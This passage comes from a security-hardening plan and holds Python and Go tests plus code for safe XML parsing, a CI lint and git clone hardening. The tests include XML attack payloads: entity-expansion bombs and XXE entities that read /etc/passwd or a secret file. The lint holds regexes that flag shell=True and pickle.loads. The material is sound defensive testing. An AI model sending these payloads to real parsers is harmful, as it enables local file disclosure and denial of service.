  <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
  <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
  <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
  <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
  <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
  <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
]>
<lolz>&lol9;</lolz>"""

    start = time.monotonic()
    result = safe_xml_parse(payload)
    elapsed = time.monotonic() - start

    assert result is None
    assert elapsed < 1.0, f"Parse took {elapsed:.2f}s — entity expansion may have occurred"
```

### Attack sample 7 — Quadratic blowup — DEFENSE IN DEPTH

```python
def test_quadratic_blowup_blocked_quickly():
    """[DEFENSE IN DEPTH] Quadratic blowup MUST be blocked.

    Same expat amplification-factor protection as billion-laughs.
    defusedxml's forbid_entities=True is layered defense.
    """
    big_string = "A" * 1000
    refs = "&a;" * 10_000
    payload = f"""<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY a "{big_string}">]>
<foo>{refs}</foo>"""

    start = time.monotonic()
    result = safe_xml_parse(payload)
    elapsed = time.monotonic() - start

    assert result is None
    assert elapsed < 1.0, f"Parse took {elapsed:.2f}s — quadratic blowup may have occurred"
```

### Attack sample 8 — Bare DOCTYPE — EFFECTIVE TDD TEST

```python
def test_bare_doctype_blocked():
    """[EFFECTIVE TDD] Any DOCTYPE block MUST be rejected.

    Empirically verified: current code parses `<!DOCTYPE foo><foo>bar</foo>`
    successfully (returns Element). Post-fix: defusedxml's forbid_dtd=True
    raises DTDForbidden; safe_xml_parse returns None.

    This is one of three tests that fail against current code and pass
    after the fix (along with #0 entity smuggling and #3 external DTD).
    """
    payload = """<?xml version="1.0"?>
<!DOCTYPE foo>
<foo>bar</foo>"""

    result = safe_xml_parse(payload)
    assert result is None
```

### Attack sample 9 — Mixed-case DOCTYPE / variant whitespace bypass attempt — EFFECTIVE TDD TEST

```python
def test_doctype_case_variants_blocked():
    """[EFFECTIVE TDD] DOCTYPE with case/whitespace variants MUST still be blocked.

    Current code accepts these variants (XML spec is case-sensitive but
    expat tolerates lowercase / extra whitespace). Post-fix: defusedxml
    rejects all DOCTYPE forms.
    """
    variants = [
        '<!doctype foo>',
        '<!DOCTYPE  foo  >',
        '<!\nDOCTYPE\nfoo\n>',
    ]
    for doctype in variants:
        payload = f'<?xml version="1.0"?>\n{doctype}\n<foo></foo>'
        assert safe_xml_parse(payload) is None, f"failed to block: {doctype!r}"
```

### Attack sample 10 — XInclude (defusedxml does not block by default; document)

```python
def test_xinclude_passes_through_unrendered():
    """XInclude `<xi:include href="...">` is parsed as a regular element by
    fromstring (NOT processed). defusedxml does not unconditionally block
    XInclude; processing happens only if the caller explicitly enables it
    via ElementInclude.include(). safe_xml_parse never calls include(), so
    XInclude content is left as-is in the tree, making it not exploitable.
    """
    payload = """<?xml version="1.0"?>
<root xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include href="file:///etc/passwd"/>
</root>"""

    result = safe_xml_parse(payload)
    # Parses successfully; xi:include element is preserved verbatim, not resolved.
    assert result is not None
    # Confirm the element is in the tree but the file content is NOT.
    from xml.etree.ElementTree import tostring
    text = tostring(result, encoding="unicode")
    assert "xi:include" in text or "include" in text
    assert "root:" not in text  # /etc/passwd content not loaded
```

### Attack sample 11 — Mixed real content with smuggled-entity URL — EFFECTIVE TDD TEST

```python
def test_doctype_after_legitimate_xml_blocked(tmp_path):
    """[EFFECTIVE TDD] DOCTYPE block embedded in otherwise-legitimate sitemap XML
    with internal entity smuggling MUST be blocked.

    This is the ATTACK 1.E variant exercised in the empirical proof, applied
    to a sitemap-shaped envelope. Current code parses successfully and the
    smuggled URL ends up in the tree. Post-fix: defusedxml rejects.

    Distinct from sample 0 by exercising mixed-shape input where the
    legitimate URL surrounds the smuggled one — proves the smuggling
    works alongside valid content, not just in isolation.
    """
    secret = tmp_path / "secret.txt"
    secret.write_text("HIDDEN_FROM_DOCTYPE_INJECTION")
    payload = f"""<?xml version="1.0"?>
<!DOCTYPE urlset [<!ENTITY xxe SYSTEM "file://{secret}">]>
<urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">
  <url><loc>https://example.com/&xxe;</loc></url>
</urlset>"""

    result = safe_xml_parse(payload)
    assert result is None
```

### Attack sample 12 — UTF-16 / encoding-prefix BOM payload — EFFECTIVE TDD TEST

```python
def test_utf16_doctype_blocked():
    """[EFFECTIVE TDD] DOCTYPE accepted even with non-UTF-8 encoding declaration.

    Current code parses payloads with `encoding="utf-16"` declarations and
    DOCTYPE blocks. Post-fix: defusedxml rejects regardless of declared
    encoding.
    """
    payload = """<?xml version="1.0" encoding="utf-16"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<foo>&xxe;</foo>"""

    result = safe_xml_parse(payload)
    assert result is None
```

### Attack sample 13 — Empty entity block (edge case) — EFFECTIVE TDD TEST

```python
def test_empty_entity_block_handled():
    """[EFFECTIVE TDD] DOCTYPE with empty entity block MUST be blocked.

    Current code parses `<!DOCTYPE foo []><foo></foo>` successfully.
    Post-fix: defusedxml's forbid_dtd=True rejects.
    """
    payload = """<?xml version="1.0"?>
<!DOCTYPE foo []>
<foo></foo>"""

    result = safe_xml_parse(payload)
    assert result is None
```

### Benign sample 1 — Valid sitemap

```python
def test_valid_sitemap_parses():
    """Standard sitemap.xml MUST still parse correctly."""
    payload = """<?xml version="1.0" encoding="UTF-8"?>
<urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">
  <url><loc>https://example.com/</loc></url>
  <url><loc>https://example.com/about</loc></url>
  <url><loc>https://example.com/api/users</loc></url>
</urlset>"""

    result = safe_xml_parse(payload)
    assert result is not None
    locs = [el.text for el in result.iter("{http://www.sitemaps.org/schemas/sitemap/0.9}loc")]
    assert "https://example.com/" in locs
    assert "https://example.com/api/users" in locs
```

### Benign sample 2 — Valid sitemap index

```python
def test_valid_sitemap_index_parses():
    """Sitemap index format MUST still parse."""
    payload = """<?xml version="1.0" encoding="UTF-8"?>
<sitemapindex xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">
  <sitemap><loc>https://example.com/sitemap1.xml</loc></sitemap>
  <sitemap><loc>https://example.com/sitemap2.xml</loc></sitemap>
</sitemapindex>"""

    result = safe_xml_parse(payload)
    assert result is not None
```

### Benign sample 3 — Valid SOAP/WSDL

```python
def test_valid_wsdl_parses():
    """WSDL XML (no DOCTYPE, no entities) MUST still parse."""
    payload = """<?xml version="1.0"?>
<definitions xmlns="http://schemas.xmlsoap.org/wsdl/"
             targetNamespace="http://example.com/stockquote.wsdl">
  <message name="GetStockPrice">
    <part name="symbol" type="xsd:string"/>
  </message>
</definitions>"""

    result = safe_xml_parse(payload)
    assert result is not None
    # Find message element regardless of namespace prefix
    found = False
    for el in result.iter():
        if el.tag.endswith("message"):
            found = True
            break
    assert found
```

### Benign sample 4 — Empty input handled

```python
def test_empty_input_returns_none():
    """Empty string MUST return None without raising."""
    assert safe_xml_parse("") is None
```

### Benign sample 5 — Oversized input rejected by size cap (defense in depth)

```python
def test_oversized_input_rejected_by_size_cap():
    """Input > _MAX_XML_SIZE MUST return None even if otherwise valid."""
    huge_url_count = (_MAX_XML_SIZE // 100) + 1000
    payload = (
        '<?xml version="1.0"?><urlset>'
        + ''.join(f'<url><loc>https://example.com/{i}</loc></url>'
                  for i in range(huge_url_count))
        + '</urlset>'
    )
    assert len(payload) > _MAX_XML_SIZE
    result = safe_xml_parse(payload)
    assert result is None
```

### `crawl.py` integration test (sitemap-specific)

`agents/discover/tests/unit/test_crawl_sitemap_xxe.py` — NEW file:

```python
"""End-to-end test for sitemap XML XXE protection in crawl.py."""
import logging
from unittest.mock import MagicMock

from discover_agent.plugins.crawl import _parse_sitemap_xml
from shared.discovery.plugin_base import DiscoveryResult


def test_sitemap_xxe_does_not_extract_local_file(tmp_path, caplog):
    """An XXE-laden sitemap response MUST NOT exfiltrate local file content
    into the DiscoveryResult."""
    secret = tmp_path / "secret.txt"
    secret.write_text("LEAKED_VIA_SITEMAP_XXE_DO_NOT_LEAK")
    payload = f"""<?xml version="1.0"?>
<!DOCTYPE urlset [<!ENTITY xxe SYSTEM "file://{secret}">]>
<urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">
  <url><loc>https://example.com/&xxe;</loc></url>
</urlset>"""
    result = DiscoveryResult()

    _parse_sitemap_xml(payload, "https://example.com", result)

    assert result.urls == []
    # The forbidden secret MUST NOT appear in any extracted URL or metadata.
    serialized = repr(result)
    assert "LEAKED_VIA_SITEMAP_XXE_DO_NOT_LEAK" not in serialized


def test_sitemap_billion_laughs_does_not_dos(tmp_path, caplog):
    """Billion-laughs sitemap MUST NOT consume excess memory/time."""
    import time
    payload = """<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol9 "&lol1;">
]>
<urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">
  <url><loc>&lol9;</loc></url>
</urlset>"""
    result = DiscoveryResult()
    start = time.monotonic()
    _parse_sitemap_xml(payload, "https://example.com", result)
    assert (time.monotonic() - start) < 1.0
    assert result.urls == []


def test_legitimate_sitemap_extracts_urls():
    """Regression: legitimate sitemap MUST still produce URLs."""
    payload = """<?xml version="1.0" encoding="UTF-8"?>
<urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">
  <url><loc>https://example.com/foo</loc></url>
  <url><loc>https://example.com/bar</loc></url>
</urlset>"""
    result = DiscoveryResult()
    _parse_sitemap_xml(payload, "https://example.com", result)
    # crawl._parse_sitemap_xml extracts to result.urls only relative paths
    # (per existing logic). Verify behavior matches what the function does today.
    assert any("foo" in u for u in result.urls)
    assert any("bar" in u for u in result.urls)
```

### Tasks

- [ ] **1.4.t1** Create `agents/shared/tests/unit/safe_input/__init__.py` (empty marker file).
- [ ] **1.4.t2** Create `agents/shared/tests/unit/safe_input/test_xml.py` with all 14 attack samples (1 primary + 13 supporting) + 5 benign tests **verbatim** — every test as-written.
- [ ] **1.4.t2b** Create `agents/discover/tests/unit/test_crawl_sitemap_xxe.py` with the 3 sitemap-specific integration tests.
- [ ] **1.4.t3** Run `python3 -m pytest agents/shared/tests/unit/safe_input/test_xml.py agents/discover/tests/unit/test_crawl_sitemap_xxe.py -v`. **All must pass.**
- [ ] **1.4.t4** Run the full discover unit test suite: `python3 -m pytest agents/discover/tests/unit/ -q`. No regressions.
- [ ] **1.4.t5** **TDD red-baseline verification (MANDATORY)**: before applying the fix from §1.2 + §1.3, run only the **5 effective TDD tests** (#0 entity smuggling, #3 external DTD, #8 bare DOCTYPE, #9 case variants, #11 smuggled-with-legitimate, #12 utf-16, #13 empty entity block) against the current unfixed code. Confirm **at least 5 of them FAIL** with `assert result is None` failure (i.e., result is non-None or smuggled content found). This empirically calibrates the tests against the proven vulnerability. After the fix, all tests must pass.
- [ ] **1.4.t6** Run the additional 8 defense-in-depth tests against current code and confirm they pass even unfixed (Python's expat already blocks them). This documents the layered protection model.

## 1.5 — Unified CI lint (covers Phase 1 XML + Phase 2 git + future safe_input modules)

### Single lint rule for the whole `safe_input` boundary

Add to `Makefile`:

```makefile
.PHONY: lint-no-direct-unsafe-input
lint-no-direct-unsafe-input:
	@echo "Checking no direct unsafe-input APIs outside shared/safe_input/..."
	@violations=0; \
	# --- 1. XML parsers ---
	out=$$(grep -rnE 'from xml\.etree\.ElementTree import (fromstring|parse|XMLParser|iterparse)|xml\.etree\..*\.fromstring' \
	    --include='*.py' agents/ backend/ cli/ mcp/ \
	    | grep -v '/.venv/' | grep -v '/tests/' \
	    | grep -v 'shared/safe_input/'); \
	if [ -n "$$out" ]; then echo "ERROR: direct xml.etree parser usage:"; echo "$$out"; violations=1; fi; \
	# --- 2. yaml.load (must use yaml.safe_load) ---
	out=$$(grep -rnE '\byaml\.(load|unsafe_load|full_load)\s*\(' \
	    --include='*.py' agents/ backend/ cli/ mcp/ \
	    | grep -v '/.venv/' | grep -v '/tests/' \
	    | grep -v 'safe_load' | grep -v 'shared/safe_input/'); \
	if [ -n "$$out" ]; then echo "ERROR: yaml.load (use yaml.safe_load):"; echo "$$out"; violations=1; fi; \
	# --- 3. pickle / marshal on untrusted bytes ---
	out=$$(grep -rnE '\b(pickle|cPickle|dill|marshal)\.(load|loads)\s*\(' \
	    --include='*.py' agents/ backend/ cli/ mcp/ \
	    | grep -v '/.venv/' | grep -v '/tests/' \
	    | grep -v 'shared/safe_input/'); \
	if [ -n "$$out" ]; then echo "ERROR: pickle/marshal on untrusted data:"; echo "$$out"; violations=1; fi; \
	# --- 4. shell=True / os.system / os.popen ---
	out=$$(grep -rnE '(shell\s*=\s*True|os\.system\(|os\.popen\()' \
	    --include='*.py' agents/ backend/ cli/ mcp/ \
	    | grep -v '/.venv/' | grep -v '/tests/' \
	    | grep -v 'shared/safe_input/'); \
	if [ -n "$$out" ]; then echo "ERROR: shell injection risk:"; echo "$$out"; violations=1; fi; \
	# --- 5. Direct subprocess git invocations not via build_git_command (Phase 2) ---
	out=$$(grep -rnE 'subprocess\.(run|Popen|call|check_output)\(\s*\[\s*["\x27]git["\x27]' \
	    --include='*.py' agents/ backend/ cli/ mcp/ \
	    | grep -v '/.venv/' | grep -v '/tests/' \
	    | grep -v 'shared/safe_input/' \
	    | grep -v 'build_git_command'); \
	if [ -n "$$out" ]; then echo "ERROR: direct git subprocess (use build_git_command):"; echo "$$out"; violations=1; fi; \
	# --- 6. Go side: exec.Command("git", ...) without hardening prefix (Phase 2) ---
	out=$$(grep -rnE 'exec\.Command(Context)?\([^)]*"git"' \
	    --include='*.go' backend/ cli/ \
	    | grep -v '_test.go' \
	    | grep -v 'pkg/gitutil/hardening.go' \
	    | grep -v 'gitHardeningArgs'); \
	if [ -n "$$out" ]; then echo "ERROR: Go git invocation without hardening:"; echo "$$out"; violations=1; fi; \
	if [ $$violations -ne 0 ]; then \
	    echo ""; echo "Use shared.safe_input.* wrappers instead of direct dangerous APIs."; \
	    exit 1; \
	fi
	@echo "ok — all unsafe-input boundaries respected"

lint: lint-no-direct-unsafe-input
```

This is **one rule** that grows as new safe wrappers are added. Phase 1 needs sections 1+2 (XML + yaml). Phase 2 adds sections 5+6 (git). Future feature 0039 adds sections for archive/base64/path/etc.

### Tasks

- [ ] **1.5.t1** Add `lint-no-direct-unsafe-input` target to `Makefile`.
- [ ] **1.5.t2** Add invocation in `.github/workflows/test.yml` (or equivalent CI config) under the lint step.
- [ ] **1.5.t3** Run `make lint-no-direct-unsafe-input`. Must succeed (zero violations after Phase 1 — or after Phase 2 if both ship together).
- [ ] **1.5.t4** **Negative test (Phase 1)**: temporarily add `from xml.etree.ElementTree import fromstring` to a non-test file; verify lint catches it. Revert.
- [ ] **1.5.t5** **Negative test (Phase 2)**: temporarily add `subprocess.run(["git", "log"])` to a non-test file; verify lint catches it. Revert.
- [ ] **1.5.t6** Document the lint surface in `agents/shared/shared/safe_input/README.md` — list each banned-API category and the safe alternative.

## 1.6 — Phase 1 acceptance criteria

- [ ] `defusedxml>=0.7.1` in **`agents/shared/pyproject.toml`** (transitively reaches all agents).
- [ ] `agents/shared/shared/safe_input/__init__.py` and `README.md` exist; `__init__` re-exports `safe_xml_parse`.
- [ ] `agents/shared/shared/safe_input/xml.py` is the canonical home of `safe_xml_parse`.
- [ ] `agents/discover/discover_agent/plugins/_shared.py` deletes its local `safe_xml_parse`; imports `from shared.safe_input.xml import safe_xml_parse`. Existing callers `from discover_agent.plugins._shared import safe_xml_parse` keep working via the re-exported import.
- [ ] `agents/discover/discover_agent/plugins/crawl.py` calls `safe_xml_parse` (not `ElementTree.fromstring`); `# noqa: S314` suppression deleted.
- [ ] All 14 attack tests + 5 benign tests in `agents/shared/tests/unit/safe_input/test_xml.py` + 3 sitemap integration tests in `agents/discover/tests/unit/test_crawl_sitemap_xxe.py` pass.
- [ ] Existing discover unit tests pass with no regressions.
- [ ] `make lint-no-direct-unsafe-input` passes (XML + yaml + pickle + shell sections all green).
- [ ] **Empirical TDD calibration confirmed**: with the fix reverted, the **6 effective TDD tests** (#0, #3, #8, #9, #11, #12, #13) fail; the **8 defense-in-depth tests** still pass (proving Python's expat baseline). After the fix, all tests pass.
- [ ] PR description references the empirical proof transcript in §"Empirical validation" and the Phase 1 entity-smuggling exploit shown in attack sample #0.

---

# Phase 2 — Git clone + command hardening

**Goal**: Apply CVE-2024-32002-class hardening flags to every git invocation against attacker-controlled clones. Verify with fixture-based tests using real malicious `.git/config` and post-checkout hooks.

## 2.1 — Hardening constants in new `pkg/gitutil/hardening.go`

### File location

`backend/pkg/gitutil/hardening.go` — NEW file.

### Content

```go
// Package gitutil — shared hardening flags for safe operation against
// untrusted git repositories.
//
// Background: git reads `.git/config` from the repository directory it is
// operating against. A malicious repo can set core.fsmonitor, core.editor,
// core.pager, core.sshCommand, etc. to attacker-controlled binaries that
// execute when subsequent git commands run. Some operations (notably
// recursive submodule clone with case-folding filesystems, CVE-2024-32002)
// can write into .git/hooks/ during clone, then trigger them on subsequent
// commands.
//
// gitHardeningArgs returns -c flag pairs that neutralize these vectors and
// MUST prefix every git command Vulture invokes against a clone whose
// .git/config is not trusted (i.e., every clone of an external URL).
//
// gitCloneArgs returns -c flags that apply only at clone time:
//   - core.protectHFS / core.protectNTFS — case-folding attack protection
//   - protocol.allow=user — restrict default-allowed protocols
//   - protocol.file.allow=never / protocol.ext.allow=never — block dangerous
//     protocols even in submodule URLs
//   - submodule.recurse=false — never recurse, even if config says otherwise
//   - core.symlinks=false — refuse to materialize symlinks at clone time
package gitutil

// gitHardeningArgs returns the flag list that prefixes ANY git command run
// against an untrusted repository directory. These flags override any value
// that might be set in the repo's .git/config.
//
// Returns a fresh slice each call so callers can append safely.
func gitHardeningArgs() []string {
	return []string{
		"-c", "core.fsmonitor=",         // disable any fsmonitor binary
		"-c", "core.hooksPath=/dev/null", // disable hook execution
		"-c", "core.editor=true",         // /bin/true — never invoke a real editor
		"-c", "core.pager=cat",           // never invoke a pager (which can run arbitrary)
		"-c", "core.sshCommand=ssh",      // override any sshCommand override
		"-c", "safe.directory=*",         // bypass ownership check (we own the dir)
	}
}

// gitCloneArgs returns -c flags applied ONLY to `git clone`. These prevent
// dangerous behavior at clone time itself.
func gitCloneArgs() []string {
	return []string{
		"-c", "core.protectHFS=true",      // CVE-2024-32002 mitigation
		"-c", "core.protectNTFS=true",     // CVE-2024-32002 mitigation
		"-c", "core.symlinks=false",       // refuse to materialize symlinks
		"-c", "protocol.allow=user",       // default protocol policy
		"-c", "protocol.file.allow=never", // block file:// in submodule URLs
		"-c", "protocol.ext.allow=never",  // block ext:: transport
		"-c", "submodule.recurse=false",   // never recurse submodules
	}
}
```

### Tasks

- [ ] **2.1.t1** Create `backend/pkg/gitutil/hardening.go` with the exact content above.
- [ ] **2.1.t2** Run `go vet ./pkg/gitutil/`. Must pass.
- [ ] **2.1.t3** Run `go test ./pkg/gitutil/ -count=1`. Existing tests must still pass.

## 2.2 — Apply to `clone.go`

### Current code (lines 60-92)

```go
func Clone(ctx context.Context, gitURL, destPath string, depth int, creds *model.GitCredentials) error {
	if err := ValidateGitURL(gitURL, creds); err != nil {
		return err
	}
	args := []string{"clone"}
	if depth > 0 {
		args = append(args, "--depth", fmt.Sprintf("%d", depth))
	}

	env := os.Environ()
	effectiveURL := gitURL

	if creds != nil {
		// ... cred handling ...
	}

	args = append(args, effectiveURL, destPath)
	cmd := exec.CommandContext(ctx, "git", args...)
	cmd.Env = env
	if err := cmd.Run(); err != nil {
		return fmt.Errorf("git clone failed: %w", scrubCredentials(err))
	}
	return nil
}
```

### Replacement code

```go
func Clone(ctx context.Context, gitURL, destPath string, depth int, creds *model.GitCredentials) error {
	if err := ValidateGitURL(gitURL, creds); err != nil {
		return err
	}
	// Hardening prefix MUST come before the "clone" subcommand.
	args := []string{}
	args = append(args, gitHardeningArgs()...)
	args = append(args, gitCloneArgs()...)
	args = append(args, "clone")
	if depth > 0 {
		args = append(args, "--depth", fmt.Sprintf("%d", depth))
	}

	env := os.Environ()
	effectiveURL := gitURL

	if creds != nil {
		// ... cred handling unchanged ...
	}

	args = append(args, effectiveURL, destPath)
	cmd := exec.CommandContext(ctx, "git", args...)
	cmd.Env = env
	if err := cmd.Run(); err != nil {
		return fmt.Errorf("git clone failed: %w", scrubCredentials(err))
	}
	return nil
}
```

### Tasks

- [ ] **2.2.t1** Modify `Clone` to prepend `gitHardeningArgs()` + `gitCloneArgs()` before the `"clone"` subcommand.
- [ ] **2.2.t2** Run existing `clone_test.go` — must still pass.
- [ ] **2.2.t3** Verify command line shape with a unit test (see 2.5.t1).

## 2.3 — Apply to `info.go`

### Current code (lines 30-43)

```go
func isGitRepo(path string) bool {
	cmd := exec.Command("git", "-C", path, "rev-parse", "--git-dir")
	return cmd.Run() == nil
}

func gitCmd(repoPath string, args ...string) string {
	fullArgs := append([]string{"-C", repoPath}, args...)
	cmd := exec.Command("git", fullArgs...)
	out, err := cmd.Output()
	if err != nil {
		return ""
	}
	return strings.TrimSpace(string(out))
}
```

### Replacement code

```go
func isGitRepo(path string) bool {
	args := append(gitHardeningArgs(), "-C", path, "rev-parse", "--git-dir")
	cmd := exec.Command("git", args...)
	return cmd.Run() == nil
}

func gitCmd(repoPath string, args ...string) string {
	fullArgs := append([]string{}, gitHardeningArgs()...)
	fullArgs = append(fullArgs, "-C", repoPath)
	fullArgs = append(fullArgs, args...)
	cmd := exec.Command("git", fullArgs...)
	out, err := cmd.Output()
	if err != nil {
		return ""
	}
	return strings.TrimSpace(string(out))
}
```

### Tasks

- [ ] **2.3.t1** Modify `isGitRepo` to prepend `gitHardeningArgs()`.
- [ ] **2.3.t2** Modify `gitCmd` to prepend `gitHardeningArgs()`.
- [ ] **2.3.t3** Run existing `info_test.go` — must still pass.

## 2.4a — Implement Python `safe_input/git.py` (canonical home)

### Create `agents/shared/shared/safe_input/git.py`

NEW file — the Python-side mirror of `pkg/gitutil/hardening.go`. Any Python code invoking git uses these constants and the `build_git_command()` helper.

```python
"""Safe git invocation helpers.

Every git command run against an attacker-controlled clone MUST be built
via build_git_command() so the hardening prefix is applied. CI lint
(`lint-no-direct-unsafe-input`) enforces this — direct `subprocess.run(["git", ...])`
without going through this module fails CI.

Mirrors backend/pkg/gitutil/hardening.go on the Go side.
"""
from __future__ import annotations

# Hardening flags prefixed to EVERY git command against untrusted clones.
# Override any value the repo's .git/config might set.
GIT_HARDENING_ARGS: tuple[str, ...] = (
    "-c", "core.fsmonitor=",          # disable fsmonitor binary execution
    "-c", "core.hooksPath=/dev/null",  # disable hook execution
    "-c", "core.editor=true",          # /bin/true — never invoke a real editor
    "-c", "core.pager=cat",            # never invoke a pager
    "-c", "core.sshCommand=ssh",       # override any sshCommand override
    "-c", "safe.directory=*",          # bypass ownership check (we own the dir)
)

# Additional flags applied ONLY to `git clone`. CVE-2024-32002 mitigations.
GIT_CLONE_ARGS: tuple[str, ...] = (
    "-c", "core.protectHFS=true",
    "-c", "core.protectNTFS=true",
    "-c", "core.symlinks=false",
    "-c", "protocol.allow=user",
    "-c", "protocol.file.allow=never",
    "-c", "protocol.ext.allow=never",
    "-c", "submodule.recurse=false",
)


def build_git_command(repo_path: str, *git_args: str, clone: bool = False) -> list[str]:
    """Build a hardened git command line.

    Args:
        repo_path: Path passed to `git -C <repo_path>`. Pass empty string to
                   skip `-C` (only for `git clone`).
        *git_args: Subcommand and its arguments (e.g. "log", "--format=%H").
        clone: If True, also includes GIT_CLONE_ARGS (use only when invoking clone).

    Returns:
        Argument list for subprocess.run(...). Always pass shell=False
        (the default); never use shell=True with this output.

    Example:
        cmd = build_git_command("/path/to/repo", "log", "--format=%H")
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
    """
    cmd = ["git"]
    cmd.extend(GIT_HARDENING_ARGS)
    if clone:
        cmd.extend(GIT_CLONE_ARGS)
    if repo_path:
        cmd.extend(["-C", repo_path])
    cmd.extend(git_args)
    return cmd
```

### Wire into `safe_input/__init__.py`

Update `agents/shared/shared/safe_input/__init__.py`:

```python
from shared.safe_input.xml import safe_xml_parse                              # Phase 1
from shared.safe_input.git import GIT_HARDENING_ARGS, GIT_CLONE_ARGS, build_git_command  # Phase 2

__all__ = [
    "safe_xml_parse",
    "GIT_HARDENING_ARGS",
    "GIT_CLONE_ARGS",
    "build_git_command",
]
```

### Tasks

- [ ] **2.4a.t1** Create `agents/shared/shared/safe_input/git.py` with the body above. Verbatim.
- [ ] **2.4a.t2** Update `agents/shared/shared/safe_input/__init__.py` to export the three git helpers.
- [ ] **2.4a.t3** Smoke import test:
  ```
  python3 -c "from shared.safe_input import build_git_command; \
              print(build_git_command('/tmp/repo', 'log'))"
  # Expected: ['git', '-c', 'core.fsmonitor=', '-c', ..., '-C', '/tmp/repo', 'log']
  ```

## 2.4 — Refactor Python `git_history.py` to use `safe_input.git`

### Current code (lines 22-34)

```python
cmd = [
    "git", "-C", str(root), "log",
    "--format=%H|%an|%aI|%s",
    "-n", "50",
]
if file:
    cmd.extend(["--", file])

try:
    result = subprocess.run(
        cmd, capture_output=True, text=True, timeout=10, check=False
    )
```

### Replacement code (uses safe_input.git)

```python
from shared.safe_input.git import build_git_command


def git_log(path: str, file: str = "") -> list[dict]:
    """Get git log for a repository, optionally filtered by file."""
    root = Path(path)
    if not (root / ".git").is_dir():
        return []

    args = ["log", "--format=%H|%an|%aI|%s", "-n", "50"]
    if file:
        args.extend(["--", file])
    cmd = build_git_command(str(root), *args)

    try:
        result = subprocess.run(
            cmd, capture_output=True, text=True, timeout=10, check=False
        )
    # ... rest unchanged ...
```

The `_GIT_HARDENING_ARGS` constant defined in this file is **deleted** — the canonical home is now `shared.safe_input.git`. `git_history.py` becomes a thin caller.

### Tasks

- [ ] **2.4.t1** Add `from shared.safe_input.git import build_git_command` import to `git_history.py`.
- [ ] **2.4.t2** Replace the manual `cmd = ["git", ...]` construction in `git_log` with `cmd = build_git_command(str(root), *args)`. No local `_GIT_HARDENING_ARGS` constant in `git_history.py` (canonical home is `safe_input/git.py`).
- [ ] **2.4.t3** Run `python3 -m pytest agents/shared/tests/` — must still pass.

## 2.5 — Test corpus (PRECISE — every test mandatory)

### 2.5.1 — Flag-presence tests in `backend/pkg/gitutil/hardening_test.go`

NEW file. Validates that the constants contain exactly the expected flags. Catches accidental deletion or reordering.

```go
package gitutil

import (
	"strings"
	"testing"
)

func TestGitHardeningArgs_ContainsAllFlags(t *testing.T) {
	args := gitHardeningArgs()
	required := map[string]string{
		"core.fsmonitor=":         "fsmonitor must be empty-overridden",
		"core.hooksPath=/dev/null": "hooks must be disabled",
		"core.editor=true":         "editor must be /bin/true",
		"core.pager=cat":           "pager must be cat",
		"core.sshCommand=ssh":      "sshCommand must be plain ssh",
		"safe.directory=*":         "safe.directory must be wildcard",
	}
	joined := strings.Join(args, " ")
	for substr, reason := range required {
		if !strings.Contains(joined, substr) {
			t.Errorf("gitHardeningArgs missing %q (%s); got: %v", substr, reason, args)
		}
	}
}

func TestGitHardeningArgs_FormatsAsConfigPairs(t *testing.T) {
	args := gitHardeningArgs()
	for i := 0; i < len(args); i += 2 {
		if args[i] != "-c" {
			t.Errorf("position %d: expected '-c', got %q", i, args[i])
		}
		if i+1 >= len(args) {
			t.Errorf("trailing -c at position %d with no value", i)
			break
		}
		if !strings.Contains(args[i+1], "=") {
			t.Errorf("position %d: expected key=value pair, got %q", i+1, args[i+1])
		}
	}
}

func TestGitCloneArgs_ContainsCVE_2024_32002_Mitigations(t *testing.T) {
	args := gitCloneArgs()
	required := []string{
		"core.protectHFS=true",
		"core.protectNTFS=true",
		"core.symlinks=false",
		"protocol.allow=user",
		"protocol.file.allow=never",
		"protocol.ext.allow=never",
		"submodule.recurse=false",
	}
	joined := strings.Join(args, " ")
	for _, substr := range required {
		if !strings.Contains(joined, substr) {
			t.Errorf("gitCloneArgs missing %q; got: %v", substr, args)
		}
	}
}

func TestGitHardeningArgs_ReturnsFreshSlice(t *testing.T) {
	a := gitHardeningArgs()
	b := gitHardeningArgs()
	a[0] = "MUTATED"
	if b[0] == "MUTATED" {
		t.Fatal("gitHardeningArgs returned shared slice — mutation leaked")
	}
}

func TestGitCloneArgs_ReturnsFreshSlice(t *testing.T) {
	a := gitCloneArgs()
	b := gitCloneArgs()
	a[0] = "MUTATED"
	if b[0] == "MUTATED" {
		t.Fatal("gitCloneArgs returned shared slice — mutation leaked")
	}
}
```

### 2.5.2 — Hook-blocking integration test in `backend/pkg/gitutil/clone_security_test.go`

NEW file. Creates a fixture repo with malicious `.git/config` and a post-checkout hook, verifies hooks do NOT execute when Vulture's gitCmd runs against it.

```go
package gitutil

import (
	"context"
	"os"
	"os/exec"
	"path/filepath"
	"testing"
)

// Set up a "malicious" git repository with a post-checkout hook that creates
